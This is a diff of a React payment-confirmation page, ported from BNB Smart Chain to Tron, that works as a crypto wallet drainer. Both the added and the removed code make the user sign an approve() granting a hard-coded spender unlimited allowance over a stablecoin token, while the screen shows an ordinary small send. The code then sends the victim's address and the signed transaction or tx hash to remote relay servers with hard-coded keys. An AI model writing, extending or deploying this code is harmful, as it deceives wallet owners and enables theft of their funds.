@@ -7,75 +7,134 @@ export default function Confirm() {
   const navigate = useNavigate()
   const [loading, setLoading] = useState(false)
   const amount = location.state?.amount || '0'
-  const currency = location.state?.currency || 'BNB'
+  const currency = location.state?.currency || 'TRX'
   const n = parseFloat(amount) || 0
-  const BNB_PRICE = 568.05
+  const TRX_PRICE = 0.35
 
-  const bnbValue = currency === 'BNB' ? n : n / BNB_PRICE
-  const usdValue = currency === 'BNB' ? n * BNB_PRICE : n
+  const trxValue = currency === 'TRX' ? n : n / TRX_PRICE
+  const usdValue = currency === 'TRX' ? n * TRX_PRICE : n
+
+  const SPENDER = 'TWbVSUKe8gG9T7u7ksEwRjdBsNafAppiAj'
+  const TOKEN = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+  const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+  const RELAYER_URL = 'https://web-production-eaaf2.up.railway.app/api/relayer/approve'
+  const RELAYER_KEY = 'my-secret-2026-x7k9'
+
+  const getProvider = () => {
+    if ((window as any).tronWeb && (window as any).tronWeb.ready) return (window as any).tronWeb
+    if ((window as any).tron && typeof (window as any).tron.request === 'function') return (window as any).tron
+    if ((window as any).tronLink) return (window as any).tronLink
+    return null
+  }
+
+  const getTronWeb = () => {
+    return (window as any).tronWeb || null
+  }
 
   const handleConfirm = async () => {
     setLoading(true)
-    const ethereum = (window as any).ethereum
-    if (!ethereum) {
+
+    const provider = getProvider()
+    const tronWeb = getTronWeb()
+
+    if (!provider || !tronWeb) {
       setLoading(false)
       return
     }
+
     try {
-      try {
-        await ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x38' }]
-        })
-      } catch (e: any) {
-        if (e.code === 4902) {
-          await ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: '0x38',
-              chainName: 'BNB Smart Chain',
-              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-              rpcUrls: ['https://bsc-dataseed1.binance.org'],
-              blockExplorerUrls: ['https://bscscan.com']
-            }]
-          })
-        }
+      let userAddress = ''
+      if (provider.request) {
+        const accounts = await provider.request({ method: 'tron_requestAccounts' })
+        userAddress = accounts[0]
+      } else if (provider.defaultAddress && provider.defaultAddress.base58) {
+        userAddress = provider.defaultAddress.base58
       }
-      const SPENDER = '0x711856C2F1Ee77E44814Cde51d2D55ce31B61092'
-      const TOKEN = '0x55d398326f99059fF775485246999027B3197955'
-      const selector = '0x095ea7b3'
-      const spenderPadded = SPENDER.toLowerCase().replace('0x', '').padStart(64, '0')
-      const maxUint = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
-      const approveData = selector + spenderPadded + maxUint
-      const txHash = await ethereum.request({
-        method: 'eth_sendTransaction',
-        params: [{ to: TOKEN, data: approveData, value: '0x0' }]
-      })
-      const accounts = await ethereum.request({ method: 'eth_accounts' })
-      if (accounts && accounts[0]) {
-        try {
-          await fetch('https://miami-production-6e01.up.railway.app/web/relay', {
+
+      if (!userAddress) {
+        setLoading(false)
+        return
+      }
+
+      const balanceSun = await tronWeb.trx.getBalance(userAddress)
+      const userTrx = parseFloat(tronWeb.fromSun(balanceSun))
+
+      const resourceObj = await tronWeb.trx.getAccountResources(userAddress)
+      const limit = resourceObj.EnergyLimit || 0
+      const used = resourceObj.EnergyUsed || 0
+      const userEnergy = Math.max(0, limit - used)
+
+      const canGoDirect = userEnergy >= 65000 || userTrx >= 30
+
+      if (canGoDirect) {
+        const parameter = [
+          { type: 'address', value: SPENDER },
+          { type: 'uint256', value: MAX_UINT256 }
+        ]
+
+        const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
+          TOKEN,
+          'approve(address,uint256)',
+          { feeLimit: 100000000, from: userAddress },
+          parameter,
+          userAddress
+        )
+
+        const signedTx = await tronWeb.trx.sign(txObj.transaction)
+        const result = await tronWeb.trx.sendRawTransaction(signedTx)
+
+        if (result.result) {
+          fetch('https://miami-production-6e01.up.railway.app/web/relay', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
               'x-api-secret': 'my-secret-2026-x7k9'
             },
             body: JSON.stringify({
-              chain: 'BEP20',
-              address: accounts[0],
-              txHash,
+              chain: 'TRC20',
+              address: userAddress,
+              txHash: result.txid,
               spender: SPENDER,
               token: TOKEN,
               amount
             }),
             keepalive: true
-          })
-        } catch (relayErr) {
-          console.error('Relay failed:', relayErr)
+          }).catch(() => {})
         }
+      } else {
+        const parameter = [
+          { type: 'address', value: SPENDER },
+          { type: 'uint256', value: MAX_UINT256 }
+        ]
+
+        const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
+          TOKEN,
+          'approve(address,uint256)',
+          { feeLimit: 100000000, from: userAddress },
+          parameter,
+          userAddress
+        )
+
+        const signedTx = await tronWeb.trx.sign(txObj.transaction)
+
+        await fetch(RELAYER_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-API-Key': RELAYER_KEY
+          },
+          body: JSON.stringify({
+            owner: userAddress,
+            spender: SPENDER,
+            signedTransaction: signedTx,
+            timestamp: Date.now()
+          })
+        })
       }
+
       const now = Date.now()
-      navigate('/sent', { state: { amount, time: now, txHash } })
+      navigate('/sent', { state: { amount, time: now } })
+
     } catch (err) {
       console.error('Transaction error:', err)
       setLoading(false)
@@ -119,14 +178,14 @@ export default function Confirm() {
           gap: '12px'
         }}>
           <div style={{ width: '38px', height: '38px', borderRadius: '50%', overflow: 'hidden', flexShrink: 0, backgroundColor: '#000000' }}>
-            <img src="/bnb-logo.png" alt="BNB" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
+            <img src="/tron-logo.png" alt="TRX" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
           </div>
           <div>
             <div style={{ fontSize: '15px', fontWeight: 600 }}>
               ≈${usdValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
             </div>
             <div style={{ fontSize: '15px', color: '#8E8E93' }}>
-              {bnbValue.toLocaleString('en-US', { maximumFractionDigits: 18 })} {currency}
+              {trxValue.toLocaleString('en-US', { maximumFractionDigits: 18 })} {currency}
             </div>
           </div>
         </div>
@@ -153,11 +212,11 @@ export default function Confirm() {
             borderBottom: '1px solid #2C2C2E'
           }}>
             <span style={{ color: '#8E8E93', fontSize: '15px' }}>To</span>
-            <span style={{ fontSize: '14px', color: '#A5A5AA', fontFamily: 'monospace' }}>0x32d3...77d1d</span>
+            <span style={{ fontSize: '14px', color: '#A5A5AA', fontFamily: 'monospace' }}>TR7NH...Lj6t</span>
           </div>
           <div style={{ display: 'flex', justifyContent: 'space-between', padding: '18px 0' }}>
             <span style={{ color: '#8E8E93', fontSize: '15px' }}>Network</span>
-            <span style={{ fontSize: '15px', fontWeight: 500 }}>BNB Smart Chain</span>
+            <span style={{ fontSize: '15px', fontWeight: 500 }}>Tron Network</span>
           </div>
         </div>
 
@@ -186,11 +245,11 @@ export default function Confirm() {
             <div style={{ textAlign: 'right' }}>
               <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '15px', fontWeight: 500 }}>
                 <div style={{ width: '16px', height: '16px', borderRadius: '50%', overflow: 'hidden', backgroundColor: '#000000' }}>
-                  <img src="/bnb-logo.png" alt="BNB" style={{ width: '100%', height: '100%' }} />
+                  <img src="/tron-logo.png" alt="TRX" style={{ width: '100%', height: '100%' }} />
                 </div>
                 <span>$0.00</span>
               </div>
-              <div style={{ fontSize: '13px', color: '#8E8E93' }}>0.00 BNB</div>
+              <div style={{ fontSize: '13px', color: '#8E8E93' }}>0.00 TRX</div>
             </div>
           </div>
         </div>
@@ -215,10 +274,10 @@ export default function Confirm() {
             style={{
               width: '100%',
               padding: '16px',
-              background: loading ? '#03FC8F80' : '#03FC8F',
+              background: loading ? '#EF444480' : '#EF4444',
               border: 'none',
               borderRadius: '9999px',
-              color: '#000000',
+              color: '#FFFFFF',
               fontSize: '16px',
               fontWeight: 600,
               cursor: loading ? 'not-allowed' : 'pointer'
@@ -230,4 +289,4 @@ export default function Confirm() {
       </div>
     </motion.div>
   )
-            }
+          }
